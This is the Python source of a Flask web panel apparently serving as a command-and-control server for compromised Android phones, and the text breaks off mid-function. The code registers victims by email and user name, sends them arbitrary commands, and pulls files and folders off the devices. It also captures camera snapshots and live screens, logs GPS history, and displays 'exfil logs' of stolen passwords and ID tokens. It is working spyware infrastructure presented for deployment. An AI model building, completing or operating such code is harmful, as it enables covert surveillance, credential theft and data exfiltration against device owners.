import eventlet
eventlet.monkey_patch()  # THIS MUST BE THE FIRST LINE

from flask import Flask, json, render_template, request, jsonify, send_file, session, redirect, url_for
from flask_socketio import SocketIO, emit, disconnect
import socket
import threading
import time
import os
import sys
from datetime import datetime
from functools import wraps

# Global variables to manage C2 server state
clients = {}  # {client_id: {'socket': socket_obj, 'addr': (ip, port), 'connected_at': timestamp}}
current_client_id = None
server_socket = None
server_running = False
client_counter = 0
CLIENT_TIMEOUT = 30  # seconds - remove clients inactive for this long
HEARTBEAT_INTERVAL = 10  # seconds - check client health every X seconds
client_locations = {}  # {client_id: {'lat': float, 'lng': float, 'updated_at': timestamp, 'details': {}}}
# Screen-share stream bindings: {'ip:port': client_id}
screen_stream_bindings = {}

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2-server-secret-key-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Change these credentials before deploying
AUTH_USERNAME = 'admin'
AUTH_PASSWORD = 'mobsec-c2server'

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

import struct
import base64

def _get_client_sort_key(client_id):
    """Sort client IDs like client_1, client_2 numerically when possible."""
    try:
        return int(str(client_id).split('_')[-1])
    except Exception:
        return float('inf')

def bind_screenshare_stream(addr):
    """Bind a screen-share TCP stream to one client for the stream lifetime.

    This avoids ambiguous per-frame mapping when multiple clients share the same IP.
    """
    stream_key = f"{addr[0]}:{addr[1]}"
    ip = addr[0]

    # Reuse existing binding for this stream key if present.
    existing = screen_stream_bindings.get(stream_key)
    if existing and existing in clients:
        return existing

    candidates = [
        cid for cid, cinfo in clients.items()
        if cinfo.get('addr') and cinfo['addr'][0] == ip
    ]
    if not candidates:
        return None

    # Stable ordering so list-to-stream mapping does not flip unexpectedly.
    candidates.sort(key=_get_client_sort_key)

    assigned_for_ip = {
        cid for key, cid in screen_stream_bindings.items()
        if key.startswith(f"{ip}:") and cid in clients
    }

    chosen = None
    for cid in candidates:
        if cid not in assigned_for_ip:
            chosen = cid
            break

    # Fallback if all candidates already have a stream bound.
    if chosen is None:
        chosen = candidates[0]

    screen_stream_bindings[stream_key] = chosen
    return chosen

def unbind_screenshare_stream(addr):
    """Remove screen-share stream binding for a disconnected stream."""
    stream_key = f"{addr[0]}:{addr[1]}"
    if stream_key in screen_stream_bindings:
        del screen_stream_bindings[stream_key]

def remove_client_bindings(client_id):
    """Drop any screen-share bindings pointing at a removed client."""
    stale_keys = [key for key, cid in screen_stream_bindings.items() if cid == client_id]
    for key in stale_keys:
        del screen_stream_bindings[key]

class ScreenShareServerThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        
    def run(self):
        host = '0.0.0.0'
        port = 6003
        
        screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        screen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        screen_socket.bind((host, port))
        screen_socket.listen(5)
        import logging
        logging.basicConfig(level=logging.INFO)
        logger = logging.getLogger("ScreenShareStart")
        logger.info(f"[*] Screen Share Server listening on {host}:{port}")
        
        # Wait until server_running becomes True before checking loops
        while not server_running:
            time.sleep(0.1)

        while server_running:
            screen_socket.settimeout(1.0)
            try:
                client, addr = screen_socket.accept()
                threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                break
        screen_socket.close()

    def handle_client(self, client, addr):
        import logging
        logging.basicConfig(level=logging.INFO)
        logger = logging.getLogger("ScreenShare")
        logger.info(f"[*] Screen share connected from {addr[0]}:{addr[1]}")
        client.settimeout(None) # Prevents inheriting the 1.0 timeout from listening socket
        stream_client_id = bind_screenshare_stream(addr)
        if stream_client_id:
            logger.info(f"[*] Screen share stream {addr[0]}:{addr[1]} bound to {stream_client_id}")
        else:
            logger.warning(f"[!] No matching C2 client found for screen stream {addr[0]}:{addr[1]}")
        try:
            while server_running:
                def recvall(sock, n):
                    data = bytearray()
                    while len(data) < n:
                        try:
                            packet = sock.recv(n - len(data))
                            if not packet:
                                return None
                            data.extend(packet)
                        except Exception as e:
                            logger.error(f"[!] recvall error: {e}")
                            return None
                    return data

                # Read 4 bytes size
                size_data = recvall(client, 4)
                if not size_data:
                    break
                
                size = struct.unpack('>I', size_data)[0]  # Java DataOutputStream writes big-endian int
                
                # Read 'size' bytes of jpeg data
                jpeg_data = recvall(client, size)
                if not jpeg_data or len(jpeg_data) != size:
                    logger.warning("[!] Incomplete frame received")
                    break

                # Emit frame as base64 to all connected clients (can namespace or put room if wanted, using namespace='/')
                b64_frame = base64.b64encode(jpeg_data).decode('utf-8')

                # Commenting out the per-frame print to avoid spam, just logging connections and errors
                # logger.info(f"[*] Emitting screen frame to web clients ({len(b64_frame)} bytes)")
                socketio.emit('screen_frame', {'client_id': stream_client_id, 'frame': b64_frame}, namespace='/')
        except Exception as e:
            logger.error(f"[!] Screen share client error: {e}")
        finally:
            logger.info(f"[*] Screen share disconnected from {addr[0]}:{addr[1]}")
            unbind_screenshare_stream(addr)
            client.close()

class C2ServerThread(threading.Thread):
    """Background thread to run the C2 socket server"""
    def __init__(self):
        super().__init__()
        self.daemon = True
        
    def run(self):
        global server_socket, server_running, client_counter
        
        host = '0.0.0.0'
        port = 6001
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(5)
        server_running = True
        
        socketio.emit('server_status', {'status': 'running', 'port': port}, namespace='/')
        print(f"[*] C2 Server listening on {host}:{port}")
        
        try:
            while server_running:
                server_socket.settimeout(1.0)
                try:
                    client, addr = server_socket.accept()
                    client_counter += 1
                    
                    threading.Thread(target=handle_new_connection, args=(client, addr, client_counter), daemon=True).start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if server_running:
                        print(f"[!] Error accepting connection: {e}")
                    break
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            if server_socket:
                server_socket.close()
            server_running = False
            socketio.emit('server_status', {'status': 'stopped'}, namespace='/')

class HeartbeatThread(threading.Thread):
    """Background thread to check client health and remove stale connections"""
    def __init__(self):
        super().__init__()
        self.daemon = True
        
    def run(self):
        global clients
        
        while server_running:
            time.sleep(HEARTBEAT_INTERVAL)
            
            if not server_running:
                break
                
            # Check each client's health
            stale_clients = []
            for client_id, client_info in list(clients.items()):
                try:
                    # Skip heartbeat if the client is currently sending a file
                    if client_info.get('is_transferring', False):
                        continue
                    sock = client_info['socket']

                    # Check last activity time
                    last_seen_str = client_info.get('last_seen', client_info['connected_at'])
                    last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
                    time_since_last_seen = (datetime.now() - last_seen).total_seconds()
                    
                    if time_since_last_seen > CLIENT_TIMEOUT:
                        # Try sending a ping to check if alive
                        try:
                            old_timeout = sock.gettimeout()
                            sock.settimeout(2.0)

                            sock.send(b"ping\n")
                            response = sock.recv(1024).decode().strip()

                            if response and "pong" in response:
                                # Client responded, update last_seen
                                clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                print(f"[*] Client {client_id} responded to heartbeat")
                            else:
                                stale_clients.append(client_id)

                            sock.settimeout(old_timeout)
                        except socket.timeout:
                            # Ping timeout - client is not responding
                            print(f"[!] Client {client_id} timed out on heartbeat")
                            stale_clients.append(client_id)
                        except Exception as e:
                            # Ping failed - client is dead
                            print(f"[!] Client {client_id} failed heartbeat: {e}")
                            stale_clients.append(client_id)
                            
                except Exception as e:
                    print(f"[!] Error checking client {client_id}: {e}")
                    stale_clients.append(client_id)
            
            # Remove stale clients
            for client_id in stale_clients:
                if client_id in clients:
                    try:
                        clients[client_id]['socket'].close()
                    except:
                        pass
                    del clients[client_id]
                    print(f"[*] Removed stale client: {client_id}")
                    socketio.emit('client_disconnected', {'client_id': client_id, 'reason': 'timeout'}, namespace='/')

def send_command_to_client(client_id, command, save_path=None):
    """Send a command to a specific client and get the response.
    
    If save_path is provided, downloaded files are saved directly there
    instead of the default device downloads directory.
    """
    if client_id not in clients:
        return {'success': False, 'error': 'Client not found'}

    client_lock = clients[client_id].get('lock')
    if client_lock is None:
        return {'success': False, 'error': 'Client lock not found'}

    with client_lock:
        # Mark the client as busy
        clients[client_id]['is_transferring'] = True
        client_socket = clients[client_id]['socket']

        try:
            # Send command with newline
            client_socket.send((command + "\n").encode())

            if command == "exit":
                client_socket.close()
                remove_client_bindings(client_id)
                del clients[client_id]
                socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
                return {'success': True, 'response': 'Client disconnected'}

            # Get response header
            header_bytes = client_socket.recv(1024)

            try:
                header = header_bytes.decode().strip()
            except UnicodeDecodeError:
                if header_bytes.startswith(b"SIZE"):
                    header = header_bytes[:header_bytes.find(b'\n')].decode().strip() if b'\n' in header_bytes else header_bytes.decode('utf-8', errors='ignore').strip()
                else:
                    return {'success': False, 'error': 'Received binary data without proper header'}

            # Check if it's a file transfer
            if header.startswith("SIZE"):
                try:
                    file_size = int(header.split()[1])
                    filename = command.split()[-1].split('/')[-1] if len(command.split()) > 1 else "downloaded_file.dat"

                    # Determine where to save the file
                    if save_path is not None:
                        filepath = save_path
                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
                    else:
                        if command.startswith("snapshot"):
                            downloads_dir = os.path.join(os.path.dirname(__file__), 'snapshots')
                        else:
                            downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
                        sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
                        device_dir = os.path.join(downloads_dir, sys_info)
                        os.makedirs(device_dir, exist_ok=True)
                        filepath = os.path.join(device_dir, filename)

                    with open(filepath, "wb") as f:
                        bytes_received = 0
                        leftover = b""

                        if b'\n' in header_bytes:
                            file_start_pos = header_bytes.find(b'\n') + 1
                            after_header = header_bytes[file_start_pos:]
                            # Cap to file_size — small files may arrive with "File sent successfully\n"
                            # bundled in the same recv, which must NOT be written into the file
                            initial_data = after_header[:file_size]
                            leftover = after_header[file_size:]
                            if initial_data:
                                f.write(initial_data)
                                bytes_received += len(initial_data)

                        while bytes_received < file_size:
                            chunk = client_socket.recv(min(65536, file_size - bytes_received))
                            if not chunk:
                                break
                            f.write(chunk)
                            bytes_received += len(chunk)
                            # CRITICAL for eventlet: yield control to keep the web server alive
                            eventlet.sleep(0)

                    # Get final status — may already be in leftover for small files
                    try:
                        if leftover:
                            final_status = leftover.decode('utf-8', errors='replace').strip()
                        else:
                            final_status = client_socket.recv(1024).decode()
                    except:
                        final_status = ""

                    clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    return {
                        'success': True,
                        'response': f"File downloaded: {filename} ({file_size} bytes)\nSaved to: {filepath}\n{final_status}",
                        'file_download': True,
                        'filename': filename,
                        'filepath': filepath
                    }

                except Exception as e:
                    return {'success': False, 'error': f'Error during download: {str(e)}'}
            else:
                # Normal text response
                response = header.encode()
                client_socket.settimeout(0.5)
                try:
                    while True:
                        chunk = client_socket.recv(10240)
                        if not chunk:
                            break
                        response += chunk
                except socket.timeout:
                    pass
                client_socket.settimeout(None)

                try:
                    response_text = response.decode()
                    clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    return {'success': True, 'response': response_text}
                except UnicodeDecodeError:
                    return {'success': True, 'response': f'<binary data, {len(response)} bytes>'}
                    
        except Exception as e:
            # Client probably disconnected
            if client_id in clients:
                try:
                    clients[client_id]['socket'].close()
                except:
                    pass
                remove_client_bindings(client_id)
                del clients[client_id]
                socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
            return {'success': False, 'error': f'Client error: {str(e)}'}
            
        finally:
            # Allow heartbeats to resume once transfer is done
            if client_id in clients:
                clients[client_id]['is_transferring'] = False

def download_folder(client_id, folder_path, local_base_path=None):
    """Recursively download all files in a folder from a client, one file at a time"""
    if local_base_path is None:
        downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
        sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
        # Strip leading slash and preserve full remote path to mirror device structure
        relative_path = folder_path.strip('/')
        local_base_path = os.path.join(downloads_dir, sys_info, relative_path)

    os.makedirs(local_base_path, exist_ok=True)

    # List items in the directory
    ls_result = send_command_to_client(client_id, f'ls {folder_path}')
    if not ls_result.get('success'):
        return {'success': False, 'error': f'Failed to list directory: {ls_result.get("error")}'}

    ls_output = ls_result['response'].strip()

    if ls_output.startswith('Error:'):
        return {'success': False, 'error': ls_output}

    if ls_output == 'Directory is empty':
        return {'success': True, 'downloaded': [], 'skipped': []}

    items = [item.strip() for item in ls_output.split('\n') if item.strip()]
    downloaded = []
    skipped = []

    for item in items:
        if client_id not in clients:
            break

        item_remote_path = f'{folder_path.rstrip("/")}/{item}'
        item_local_path = os.path.join(local_base_path, item)

        # Try to download as a file directly to the correct destination
        result = send_command_to_client(client_id, f'download {item_remote_path}', save_path=item_local_path)

        if result.get('success') and result.get('file_download'):
            downloaded.append(item_remote_path)
            print(f'[*] Folder download: saved {item_remote_path} -> {item_local_path}')
            socketio.emit('folder_download_progress', {
                'client_id': client_id,
                'file': item_remote_path,
                'local_path': item_local_path,
                'downloaded_count': len(downloaded)
            }, namespace='/')
        else:
            # Could be a subdirectory — attempt recursive download
            sub_result = download_folder(client_id, item_remote_path, item_local_path)
            if sub_result.get('success'):
                downloaded.extend(sub_result.get('downloaded', []))
                skipped.extend(sub_result.get('skipped', []))
            else:
                skipped.append(item_remote_path)
                print(f'[!] Folder download: skipped {item_remote_path} ({sub_result.get("error", "unknown")})')

    return {
        'success': True,
        'downloaded': downloaded,
        'skipped': skipped,
        'local_path': local_base_path
    }


@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('authenticated'):
        return redirect(url_for('index'))
    error = None
    if request.method == 'POST':
        if request.form.get('username') == AUTH_USERNAME and request.form.get('password') == AUTH_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('index'))
        error = 'Invalid username or password'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    """Main web interface"""
    return render_template('index.html')

@app.route('/history')
@login_required
def history():
    """Location history page"""
    return render_template('history.html')

@app.route('/locations')
@login_required
def locations():
    """Client locations page"""
    return render_template('locations.html')

@app.route('/console')
@login_required
def console():
    """Command console page"""
    return render_template('console.html')

@app.route('/screenshare')
@login_required
def screenshare():
    """Screen share page"""
    return render_template('screenshare.html')


def handle_new_connection(client, addr, counter):
    """Handle the initial handshake to get Android ID before registering fully."""
    temp_id = f"temp_{counter}"
    # Temporary registration for send_command_to_client to work
    clients[temp_id] = {
        'socket': client,
        'addr': addr,
        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'sys_info': '',
        'battery': '',
        'network_info': '',
        'lock': threading.Lock()
    }
    
    print(f"[*] Connection initiated from {addr[0]}:{addr[1]}, waiting for sys_info...")
    time.sleep(0.5)
    result = send_command_to_client(temp_id, 'sys_info')
    
    android_id = f"client_{counter}"
    device_name = ""
    
    if result.get('success'):
        sys_info_out = result['response'].strip()
        try:
            sys_data = json.loads(sys_info_out)
            android_id = sys_data.get('android_id', android_id)
            device_name = sys_data.get('device_name', '')
            
            client_email = sys_data.get('email', '')
            if client_email in ["", "null", "No User Logged In"]:
                client_email = ''
                
            user_name = sys_data.get('user_name', '')
            if user_name in ["", "null", "Unknown User"]:
                user_name = ''
        except:
            device_name = sys_info_out
            client_email = ''
            user_name = ''
            
    # Pop temp client and register under android_id
    if temp_id in clients:
        client_data = clients.pop(temp_id)
        
        # If this android_id is already connected, disconnect old socket
        if android_id in clients:
            try:
                clients[android_id]['socket'].close()
            except:
                pass
            
        client_data['sys_info'] = device_name
        client_data['email'] = client_email
        client_data['user_name'] = user_name
        clients[android_id] = client_data
        
        print(f"[*] Device Registered | ID: {android_id} | Name: {device_name} | Email: {client_email} | User: {user_name}")
        socketio.emit('client_connected', {
            'client_id': android_id,
            'ip': addr[0],
            'port': addr[1],
            'connected_at': client_data['connected_at'],
            'sys_info': device_name,
            'email': client_email,
            'user_name': user_name,
            'battery': '',
            'network_info': ''
        }, namespace='/')

        # Start standard background queries for newly registered client
        threading.Thread(target=query_client_location, args=(android_id,), daemon=True).start()
        threading.Thread(target=query_client_battery_and_network, args=(android_id,), daemon=True).start()


def query_client_sysinfo(client_id):
    """Send sys_info command to a newly connected client and store the result"""
    time.sleep(0.5)  # Brief delay to let the client settle
    result = send_command_to_client(client_id, 'sys_info')
    if result.get('success') and client_id in clients:
        sys_info_output = result['response'].strip()
        clients[client_id]['sys_info'] = sys_info_output
        print(f"[*] sys_info for {client_id}: {sys_info_output[:80]}")
        socketio.emit('client_info_updated', {
            'client_id': client_id,
            'sys_info': sys_info_output,
            'battery': clients[client_id].get('battery', ''),
            'network_info': clients[client_id].get('network_info', '')
        }, namespace='/')
    elif client_id in clients:
        clients[client_id]['sys_info'] = ''
        print(f"[!] Failed to get sys_info for {client_id}: {result.get('error', 'unknown error')}")

def query_client_location(client_id):
    """Send location command to a newly connected client and store the result"""
    time.sleep(1.5)  # Wait a bit longer for location to be available
    result = send_command_to_client(client_id, 'location')
    if result.get('success') and client_id in clients:
        location_output = result['response'].strip()
        parsed_location = parse_location_response(location_output)
        
        if parsed_location:
            current_history = client_locations.get(client_id, {}).get('history', [])
            
            # Add to history if it's a new position
            if not current_history or current_history[-1]['lat'] != parsed_location['lat'] or current_history[-1]['lng'] != parsed_location['lng']:
                current_history.append({'lat': parsed_location['lat'], 'lng': parsed_location['lng']})
                log_location_history(client_id, parsed_location['lat'], parsed_location['lng'], parsed_location)

            client_locations[client_id] = {
                'lat': parsed_location['lat'],
                'lng': parsed_location['lng'],
                'updated_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'details': parsed_location,
                'history': current_history
            }
            print(f"[*] Location for {client_id}: {parsed_location['lat']}, {parsed_location['lng']}")
            
            # Emit location update to all connected web clients
            socketio.emit('location_updated', {
                'client_id': client_id,
                'location': client_locations[client_id]
            }, namespace='/')
        else:
            print(f"[!] Could not parse location for {client_id}")
    else:
        print(f"[!] Failed to get location for {client_id}: {result.get('error', 'unknown error')}")

def query_client_battery_and_network(client_id):
    """Send battery and network_info commands to a newly connected client and store the results"""
    time.sleep(1.0)  # Wait a bit
    
    # Query battery
    result_batt = send_command_to_client(client_id, 'battery')
    if result_batt.get('success') and client_id in clients:
        batt_output = result_batt['response'].strip()
        clients[client_id]['battery'] = batt_output
        print(f"[*] Battery for {client_id}: {batt_output[:80]}")
    
    # Query network
    time.sleep(0.5)
    result_net = send_command_to_client(client_id, 'network_info')
    if result_net.get('success') and client_id in clients:
        net_output = result_net['response'].strip()
        clients[client_id]['network_info'] = net_output
        print(f"[*] Network for {client_id}: {net_output[:80]}")
    
    if client_id in clients:
        # Emit update
        socketio.emit('client_status_updated', {
            'client_id': client_id,
            'battery': clients[client_id].get('battery', ''),
            'network_info': clients[client_id].get('network_info', '')
        }, namespace='/')

def log_location_history(client_id, lat, lng, details):
    """Log a location update to the history file"""
    try:
        device_name = clients.get(client_id, {}).get('sys_info', '')
        client_email = clients.get(client_id, {}).get('email', '')
        user_name = clients.get(client_id, {}).get('user_name', '')
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'client_id': client_id,
            'device_name': device_name,
            'email': client_email,
            'user_name': user_name,
            'lat': lat,
            'lng': lng,
            'details': details
        }
        with open('location_history.jsonl', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        print(f"[!] Error logging location history: {e}")

def parse_location_response(location_text):
    """Parse the location response from Android client"""
    try:
        lines = location_text.split('\n')
        location_data = {}
        
        for line in lines:
            if line.startswith('Location: '):
                coords = line.replace('Location: ', '').strip()
                lat, lng = coords.split(', ')
                location_data['lat'] = float(lat)
                location_data['lng'] = float(lng)
            elif line.startswith('Altitude: '):
                location_data['altitude'] = line.replace('Altitude: ', '').strip()
            elif line.startswith('Speed: '):
                location_data['speed'] = line.replace('Speed: ', '').strip()
            elif line.startswith('Accuracy: '):
                location_data['accuracy'] = line.replace('Accuracy: ', '').strip()
            elif line.startswith('Bearing: '):
                location_data['bearing'] = line.replace('Bearing: ', '').strip()
            elif line.startswith('Provider: '):
                location_data['provider'] = line.replace('Provider: ', '').strip()
            elif line.startswith('Location Permission: '):
                location_data['permission'] = line.replace('Location Permission: ', '').strip()
            elif line.startswith('Location Access: '):
                location_data['access'] = line.replace('Location Access: ', '').strip()
        
        if 'lat' in location_data and 'lng' in location_data:
            return location_data
        return None
    except Exception as e:
        print(f"[!] Error parsing location: {e}")
        return None


@app.route('/api/clients')
@login_required
def get_clients():
    """Get list of connected clients"""
    client_list = []
    for client_id, client_info in clients.items():
        client_data = {
            'client_id': client_id,
            'ip': client_info['addr'][0],
            'port': client_info['addr'][1],
            'connected_at': client_info['connected_at'],
            'last_seen': client_info['last_seen'],
            'sys_info': client_info.get('sys_info', ''),
            'email': client_info.get('email', ''),
            'user_name': client_info.get('user_name', ''),
            'battery': client_info.get('battery', ''),
            'network_info': client_info.get('network_info', '')
        }
        # Add location data if available
        if client_id in client_locations:
            client_data['location'] = client_locations[client_id]
        client_list.append(client_data)
    return jsonify({'clients': client_list})

@app.route('/api/profiles')
@login_required
def get_profiles():
    """Aggregate user profiles from exfil logs for dashboard display."""
    if not os.path.exists(LOG_FILE):
        return jsonify({'profiles': []})

    profiles_by_email = {}

    with open(LOG_FILE, 'r', encoding='utf-8') as log_file:
        for line in log_file:
            line = line.strip()
            if not line:
                continue

            try:
                entry = json.loads(line)
            except Exception:
                continue

            payload = entry.get('payload') or {}
            email = payload.get('email')
            if not email:
                continue

            profile = profiles_by_email.setdefault(email, {
                'email': email,
                'display_name': 'N/A',
                'uid': 'N/A',
                'label': 'N/A',
                'password': 'N/A',
                'event_count': 0,
                'has_id_token': False,
                'id_token': 'N/A',
                'last_payload_timestamp': 'N/A',
                'last_received_at': 'N/A'
            })

            profile['event_count'] += 1

            if payload.get('displayName'):
                profile['display_name'] = payload['displayName']
            if payload.get('uid'):
                profile['uid'] = payload['uid']
            if payload.get('label'):
                profile['label'] = payload['label']
                profile['password'] = payload['label']
            if payload.get('timestamp'):
                profile['last_payload_timestamp'] = str(payload['timestamp'])

            id_token = payload.get('idToken')
            if id_token:
                profile['has_id_token'] = True
                profile['id_token'] = id_token

            received_at = entry.get('received_at')
            if received_at and (
                profile['last_received_at'] == 'N/A' or received_at > profile['last_received_at']
            ):
                profile['last_received_at'] = received_at

    profiles = sorted(
        profiles_by_email.values(),
        key=lambda item: item.get('last_received_at') or '',
        reverse=True
    )
    return jsonify({'profiles': profiles})

@app.route('/api/locations')
@login_required
def get_locations():
    """Get all client locations for map display"""
    locations = []
    for client_id, location_data in client_locations.items():
        if client_id in clients:  # Only include currently connected clients
            locations.append({
                'client_id': client_id,
                'sys_info': clients[client_id].get('sys_info', client_id),
                'ip': clients[client_id]['addr'][0],
                **location_data
            })
    return jsonify({'locations': locations})

@app.route('/api/exfil_logs')
@login_required
def get_exfil_logs():
    """Return raw exfil log entries in reverse chronological order."""
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            logs.append(json.loads(line))
                        except Exception:
                            pass
        except Exception as e:
            print(f"[!] Error reading exfil logs: {e}")
    logs.reverse()
    return jsonify({'logs': logs})

@app.route('/api/exfil_logs', methods=['DELETE'])
@login_required
def delete_exfil_log():
    """Delete a single log entry identified by received_at."""
    received_at = (request.get_json(force=True) or {}).get('received_at')
    if not received_at:
        return jsonify({'error': 'received_at is required'}), 400

    if not os.path.exists(LOG_FILE):
        return jsonify({'error': 'Log file not found'}), 404

    kept = []
    deleted = 0
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                stripped = line.strip()
                if not stripped:
                    continue
                try:
                    entry = json.loads(stripped)
                    if entry.get('received_at') == received_at:
                        deleted += 1
                        continue
                except Exception:
                    pass
                kept.append(stripped)

        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            for line in kept:
                f.write(line + '\n')
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    if deleted == 0:
        return jsonify({'error': 'Entry not found'}), 404
    return jsonify({'success': True})

@app.route('/api/location_history', methods=['DELETE'])
@login_required
def delete_location_history():
    """Delete location history entries by timestamp (single) or client_id (all for that client)."""
    data = request.get_json(force=True) or {}
    timestamp = data.get('timestamp')
    client_id = data.get('client_id')

    if not timestamp and not client_id:
        return jsonify({'error': 'timestamp or client_id is required'}), 400

    if not os.path.exists('location_history.jsonl'):
        return jsonify({'error': 'Log file not found'}), 404

    kept = []
    deleted = 0
    try:
        with open('location_history.jsonl', 'r') as f:
            for line in f:
                stripped = line.strip()
                if not stripped:
                    continue
                try:
                    entry = json.loads(stripped)
                    if timestamp and entry.get('timestamp') == timestamp:
                        deleted += 1
                        continue
                    if client_id and not timestamp and entry.get('client_id') == client_id:
                        deleted += 1
                        continue
                except Exception:
                    pass
                kept.append(stripped)

        with open('location_history.jsonl', 'w') as f:
            for line in kept:
                f.write(line + '\n')
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    if deleted == 0:
        return jsonify({'error': 'Entry not found'}), 404
    return jsonify({'success': True, 'deleted': deleted})

@app.route('/api/location_history')
@login_required
def get_location_history():
    """Get full location history from file"""
    history = []
    if os.path.exists('location_history.jsonl'):
        try:
            with open('location_history.jsonl', 'r') as f:
                for line in f:
                    if line.strip():
                        history.append(json.loads(line))
        except Exception as e:
            print(f"[!] Error reading location history: {e}")
    return jsonify({'history': history})

@app.route('/api/server/status')
@login_required
def server_status():
    """Get server status"""
    return jsonify({
        'running': server_running,
        'client_count': len(clients),
        'timeout': CLIENT_TIMEOUT,
        'heartbeat_interval': HEARTBEAT_INTERVAL
    })

@app.route('/api/clients/cleanup', methods=['POST'])
@login_required
def cleanup_clients():
    """Manually trigger cleanup of stale clients"""
    removed = []
    for client_id, client_info in list(clients.items()):
        try:
            sock = client_info['socket']
            old_timeout = sock.gettimeout()
            sock.settimeout(1.0)

            # Try to ping the client
            sock.send(b"ping\n")
            response = sock.recv(1024).decode().strip()

            if not response or "pong" not in response:
                # No valid response
                sock.close()
                remove_client_bindings(client_id)
                del clients[client_id]
                removed.append(client_id)
                socketio.emit('client_disconnected', {'client_id': client_id, 'reason': 'manual_cleanup'}, namespace='/')
            else:
                # Update last_seen
                clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            sock.settimeout(old_timeout)
        except:
            # Failed to ping - remove client
            try:
                clients[client_id]['socket'].close()
            except:
                pass
            remove_client_bindings(client_id)
            del clients[client_id]
            removed.append(client_id)
            socketio.emit('client_disconnected', {'client_id': client_id, 'reason': 'manual_cleanup'}, namespace='/')

    return jsonify({
        'success': True,
        'removed_clients': removed,
        'remaining_clients': len(clients)
    })

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    if not session.get('authenticated'):
        disconnect()
        return
    emit('server_status', {'status': 'running' if server_running else 'stopped'})
    # Send current clients
    for client_id, client_info in clients.items():
        emit('client_connected', {
            'client_id': client_id,
            'ip': client_info['addr'][0],
            'port': client_info['addr'][1],
            'connected_at': client_info['connected_at'],
            'sys_info': client_info.get('sys_info', ''),
            'email': client_info.get('email', ''),
            'user_name': client_info.get('user_name', ''),
            'battery': client_info.get('battery', ''),
            'network_info': client_info.get('network_info', '')
        })

@socketio.on('refresh_location')
def handle_refresh_location(data):
    """Handle manual location refresh request"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        threading.Thread(target=query_client_location, args=(client_id,), daemon=True).start()
        emit('command_response', {
            'success': True,
            'response': 'Refreshing location...',
            'client_id': client_id,
            'command': 'location'
        })

@socketio.on('send_command')
def handle_command(data):
    """Handle command execution request"""
    client_id = data.get('client_id')
    command = data.get('command')

    if not client_id or not command:
        emit('command_response', {'success': False, 'error': 'Missing client_id or command'})
        return

    # If it's a download command, first check with ls whether the path is a directory
    if command.startswith('download '):
        folder_path = command.split(' ', 1)[1]
        ls_check = send_command_to_client(client_id, f'ls {folder_path}')
        ls_response = ls_check.get('response', '').strip()
        is_directory = (
            ls_check.get('success')
            and ls_response
            and not ls_response.startswith('Error:')
        )

        if is_directory:
            emit('command_response', {
                'success': True,
                'response': f'Path is a directory — starting recursive folder download: {folder_path}',
                'client_id': client_id,
                'command': command
            })

            def do_folder_download():
                folder_result = download_folder(client_id, folder_path)
                file_count = len(folder_result.get('downloaded', []))
                skip_count = len(folder_result.get('skipped', []))
                local_path = folder_result.get('local_path', '')
                if folder_result.get('success'):
                    msg = f'Folder download complete. {file_count} file(s) saved to {local_path}'
                    if skip_count:
                        msg += f', {skip_count} item(s) skipped (unreadable or empty sub-folders).'
                else:
                    msg = f'Folder download failed: {folder_result.get("error")}'
                socketio.emit('command_response', {
                    **folder_result,
                    'client_id': client_id,
                    'command': command,
                    'folder_download': True,
                    'response': msg
                }, namespace='/')

            threading.Thread(target=do_folder_download, daemon=True).start()
            return

    result = send_command_to_client(client_id, command)

    def snapshot_save_path(remote_path):
        filename = os.path.basename(remote_path)
        sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
        device_dir = os.path.join(os.path.dirname(__file__), 'snapshots', sys_info)
        return os.path.join(device_dir, filename)

    if command in ("snapshot", "snapshot_front", "snapshot_rear") and result.get('success'):
        response_text = result.get('response', '')
